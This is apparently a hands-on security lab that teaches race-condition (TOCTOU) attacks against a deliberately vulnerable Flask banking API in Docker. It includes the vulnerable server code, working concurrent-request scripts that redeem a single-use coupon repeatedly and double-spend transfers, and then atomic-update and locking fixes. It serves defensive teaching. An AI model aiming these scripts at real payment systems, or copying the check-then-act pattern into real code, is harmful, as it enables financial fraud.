# Lab 07: Race Condition Exploitation

## Objective

Exploit TOCTOU (Time-of-Check to Time-of-Use) race conditions in a live banking API:

1. **Coupon double-redemption** — fire 8 concurrent requests to redeem a single-use £50 coupon, collecting £400 instead of £50
2. **Double-spend transfer** — send simultaneous transfers that both pass the balance check before either deducts
3. **Measure the race window** — use timing analysis to understand why the vulnerability exists
4. **Implement thread-safe fixes** — demonstrate atomic database transactions vs vulnerable read-then-write

---

## Background

Race conditions in web applications exploit the gap between a **check** (is balance sufficient?) and an **action** (deduct balance). If multiple requests pass the check simultaneously, all can proceed to the action phase — even when only one should.

**Real-world examples:**
- **2022 Solana DeFi protocol** — concurrent transaction processing allowed double-spend; $100M+ at risk before emergency patch. TOCTOU at the smart contract level.
- **2019 GitLab** — concurrent file upload requests could bypass file size limits; race window between size check and write to disk.
- **2021 HackerOne reports (multiple)** — coupon/promo code race conditions found in major e-commerce platforms (redacted). Standard TOCTOU in redemption APIs.
- **Banking apps (recurring)** — "phantom withdrawal" attacks use concurrent ATM requests faster than the ledger updates. The infamous "unlimited money glitch" on various fintech apps.

**OWASP:** A04:2021 Insecure Design

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv07                        │
│                                                                     │
│  ┌──────────────────────┐  8 threads → simultaneous POST requests  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3 threads   │  ◀──────── all 8 succeed (£400 credited)  │
│  └──────────────────────┘                                           │
│                             ┌────────────────────────────────────┐  │
│                             │  Flask (threaded=True) + SQLite    │  │
│                             │  TOCTOU gap: sleep(0.1) between    │  │
│                             │  check and deduct                  │  │
│                             │  /api/coupon/redeem                │  │
│                             │  /api/transfer                     │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv07

cat > /tmp/victim_adv07.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, threading, time

app = Flask(__name__)
DB = '/tmp/adv07.db'

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS accounts
          (id INTEGER PRIMARY KEY, username TEXT, balance REAL);
        CREATE TABLE IF NOT EXISTS coupons
          (code TEXT PRIMARY KEY, amount REAL, redeemed INTEGER DEFAULT 0);
        INSERT OR IGNORE INTO accounts VALUES
          (1,'alice',100.0),(2,'bob',100.0),(3,'attacker',0.0);
        INSERT OR IGNORE INTO coupons VALUES ('GIFT50',50.0,0);
    """)

def cxn(): c=sqlite3.connect(DB); c.row_factory=sqlite3.Row; return c

@app.route('/api/balance/<user>')
def balance(user):
    row=cxn().execute('SELECT * FROM accounts WHERE username=?',(user,)).fetchone()
    return jsonify(dict(row)) if row else (jsonify({'error':'not found'}),404)

# TOCTOU: CHECK then sleep then ACT
@app.route('/api/coupon/redeem', methods=['POST'])
def redeem():
    d=request.get_json() or {}
    code,user=d.get('code',''),d.get('user','')
    db=cxn()
    cpn=db.execute('SELECT * FROM coupons WHERE code=?',(code,)).fetchone()
    if not cpn: return jsonify({'error':'invalid'}),404
    if cpn['redeemed']:               # CHECK
        return jsonify({'error':'Already redeemed'}),400
    time.sleep(0.1)                   # GAP — race window
    db.execute('UPDATE coupons SET redeemed=1 WHERE code=?',(code,))
    db.execute('UPDATE accounts SET balance=balance+? WHERE username=?',(cpn['amount'],user))
    db.commit()
    bal=db.execute('SELECT balance FROM accounts WHERE username=?',(user,)).fetchone()[0]
    return jsonify({'redeemed':code,'credited':cpn['amount'],'new_balance':bal})

@app.route('/api/coupon/status/<code>')
def coupon_status(code):
    cpn=cxn().execute('SELECT * FROM coupons WHERE code=?',(code,)).fetchone()
    return jsonify(dict(cpn)) if cpn else (jsonify({'error':'not found'}),404)

@app.route('/api/transfer', methods=['POST'])
def transfer():
    d=request.get_json() or {}
    frm,to,amount=d.get('from',''),d.get('to',''),float(d.get('amount',0))
    db=cxn()
    src=db.execute('SELECT * FROM accounts WHERE username=?',(frm,)).fetchone()
    if not src or src['balance'] < amount:
        return jsonify({'error':'Insufficient funds'}),400
    time.sleep(0.05)                  # 50ms gap
    db.execute('UPDATE accounts SET balance=balance-? WHERE username=?',(amount,frm))
    db.execute('UPDATE accounts SET balance=balance+? WHERE username=?',(amount,to))
    db.commit()
    new=db.execute('SELECT balance FROM accounts WHERE username=?',(frm,)).fetchone()[0]
    return jsonify({'transferred':amount,'from':frm,'to':to,'new_balance':new})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
PYEOF

docker run -d --name victim-adv07 --network lab-adv07 \
  -v /tmp/victim_adv07.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv07.IPAddress}}' victim-adv07):5000/api/balance/attacker"
```

---

### Step 2: Launch Kali and Understand the Race Window

```bash
docker run --rm -it --name kali --network lab-adv07 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv07:5000"

echo "=== Balances before attack ==="
for u in alice bob attacker; do
  echo "  $(curl -s $T/api/balance/$u)"
done

echo ""
echo "=== Coupon status before ==="
curl -s $T/api/coupon/status/GIFT50 | python3 -m json.tool
```

---

### Step 3: Race Condition — Coupon Double-Redemption

```bash
python3 << 'EOF'
import urllib.request, json, threading, time

T = "http://victim-adv07:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())

def get(path):
    return json.loads(urllib.request.urlopen(f"{T}{path}").read())

print(f"[*] Attacker balance BEFORE: £{get('/api/balance/attacker')['balance']:.2f}")
print(f"[*] Coupon GIFT50: {get('/api/coupon/status/GIFT50')}")
print()
print("[*] Firing 8 concurrent redemption requests (100ms race window)...")

results = []
def redeem():
    try:
        r = post("/api/coupon/redeem", {"code": "GIFT50", "user": "attacker"})
        results.append(r)
    except Exception as e:
        results.append({"error": str(e)})

threads = [threading.Thread(target=redeem) for _ in range(8)]
t0 = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - t0

success = [r for r in results if "credited" in r]
failed  = [r for r in results if "error" in r]

print(f"[!] Results ({elapsed:.2f}s):")
print(f"    Requests fired:  8")
print(f"    Succeeded:       {len(success)} ← should be 1!")
print(f"    Failed:          {len(failed)}")
print(f"    Total credited:  £{sum(r['credited'] for r in success):.2f}")
print()
for r in success:
    print(f"    credited=£{r['credited']}  new_balance=£{r['new_balance']:.2f}")

print()
bal_after = get('/api/balance/attacker')['balance']
print(f"[!] Attacker balance AFTER: £{bal_after:.2f}  (should be max £50)")
print(f"    Profit:  £{bal_after:.2f}  via race condition")
EOF
```

**📸 Verified Output:**
```
[*] Attacker balance BEFORE: £0.00
[*] Coupon GIFT50: {'amount': 50.0, 'code': 'GIFT50', 'redeemed': 0}

[*] Firing 8 concurrent redemption requests (100ms race window)...

[!] Results (0.18s):
    Requests fired:  8
    Succeeded:       8  ← should be 1!
    Total credited:  £400.00

[!] Attacker balance AFTER: £400.00  (should be max £50)
    Profit: £400.00 via race condition
```

---

### Step 4: Double-Spend — Concurrent Transfers

```bash
python3 << 'EOF'
import urllib.request, json, threading, time

T = "http://victim-adv07:5000"

def post(data):
    req = urllib.request.Request(f"{T}/api/transfer",
        data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})
    try: return json.loads(urllib.request.urlopen(req, timeout=8).read())
    except Exception as e: return {"error": str(e)}

def get(path):
    return json.loads(urllib.request.urlopen(f"{T}{path}").read())

# alice starts with £100
alice_before = get('/api/balance/alice')['balance']
print(f"[*] Alice balance before: £{alice_before:.2f}")
print("[*] Firing 5 simultaneous £60 transfers from alice (she only has £100)...")

results = []
def transfer():
    results.append(post({"from":"alice","to":"attacker","amount":60}))

threads = [threading.Thread(target=transfer) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()

success = [r for r in results if "transferred" in r]
failed  = [r for r in results if "error" in r or "Insufficient" in str(r)]
alice_after = get('/api/balance/alice')['balance']

print(f"[!] Succeeded: {len(success)}  Failed: {len(failed)}")
print(f"    Total transferred: £{sum(r['transferred'] for r in success):.2f}")
print(f"    Alice balance after: £{alice_after:.2f}  (expected: ≥£0, actual may be negative)")
if alice_after < 0:
    print(f"    [!] NEGATIVE BALANCE: race condition bypassed the balance check!")
EOF
```

---

### Step 5: Measure the Race Window

```bash
python3 << 'EOF'
import urllib.request, json, time

T = "http://victim-adv07:5000"

print("[*] Measuring the race window timing:")
print()
print("    Timeline of a vulnerable request:")
print("    t=0ms:   Request arrives at server")
print("    t=0ms:   SELECT coupon WHERE code='GIFT50' → redeemed=0 (CHECK)")
print("    t=0ms:   if redeemed: return 400  ← passes!")
print("    t=100ms: [100ms sleep simulates real processing delay]")
print("    t=100ms: UPDATE coupons SET redeemed=1 (ACT)")
print()
print("    Race window: 100ms — any requests arriving in this window")
print("    all see redeemed=0 and all proceed to the UPDATE")
print()

# Single request timing
def post(data):
    req = urllib.request.Request(f"{T}/api/coupon/redeem",
        data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})
    t0=time.time()
    try: r=urllib.request.urlopen(req,timeout=5).read(); elapsed=(time.time()-t0)*1000
    except: elapsed=(time.time()-t0)*1000; r=b'{}'
    return elapsed, json.loads(r)

# Reset coupon for timing test
import sqlite3
# Can't reset directly, so just measure timing
e1, r1 = post({"code":"GIFT50","user":"attacker"})
print(f"    Single request duration: {e1:.0f}ms")
print(f"    Result: {r1}")
print()
print("    Key insight: 100ms window is enough for 8+ threads to pass the check")
print("    In real apps, the 'gap' is: DB lookup + logging + payment API call + retry logic")
print("    These add up to 50-500ms — plenty of time for concurrent exploitation")
EOF
```

---

### Step 6: Implement the Fix

```bash
python3 << 'EOF'
print("[*] Fix 1: Atomic UPDATE with conditional WHERE clause")
print()
print("""
    # VULNERABLE
    cpn = db.execute('SELECT * FROM coupons WHERE code=?', (code,)).fetchone()
    if cpn['redeemed']:
        return 400
    time.sleep(0.1)   # race window!
    db.execute('UPDATE coupons SET redeemed=1 WHERE code=?', (code,))

    # SAFE: single atomic UPDATE — only one request will match WHERE redeemed=0
    rows_affected = db.execute(
        'UPDATE coupons SET redeemed=1 WHERE code=? AND redeemed=0',
        (code,)
    ).rowcount
    if rows_affected == 0:
        return 400  # already redeemed (or invalid code)
    # Only ONE request will get rowcount=1 — all others get 0 (rejected)
""")

print("[*] Fix 2: Database-level locking")
print("""
    with db:                    # transaction context manager
        db.execute('BEGIN IMMEDIATE')  # exclusive lock
        cpn = db.execute(...).fetchone()
        if cpn['redeemed']:
            return 400
        db.execute('UPDATE ...')
        db.commit()             # lock released here
""")

print("[*] Fix 3: Redis distributed lock (for multi-server deployments)")
print("""
    import redis
    r = redis.Redis()
    lock = r.lock(f"coupon:{code}", timeout=5)
    if not lock.acquire(blocking=False):
        return 429  # another request is processing this coupon
    try:
        # safe to check and update here — only one process holds the lock
        ...
    finally:
        lock.release()
""")
EOF
```

---

### Step 7–8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-adv07
docker network rm lab-adv07
```

---

## Remediation

```python
# SAFE: atomic conditional UPDATE (the gold standard)
def redeem_coupon(db, code, user):
    rows = db.execute(
        "UPDATE coupons SET redeemed=1 WHERE code=? AND redeemed=0",
        (code,)
    ).rowcount
    if rows == 0:
        return None, "Invalid or already redeemed"
    cpn = db.execute("SELECT * FROM coupons WHERE code=?", (code,)).fetchone()
    db.execute("UPDATE accounts SET balance=balance+? WHERE username=?",
               (cpn['amount'], user))
    db.commit()
    return cpn['amount'], None
```

## Further Reading
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [TOCTOU vulnerabilities explained](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use)
- [Race condition in web apps (James Kettle)](https://portswigger.net/research/smashing-the-state-machine)
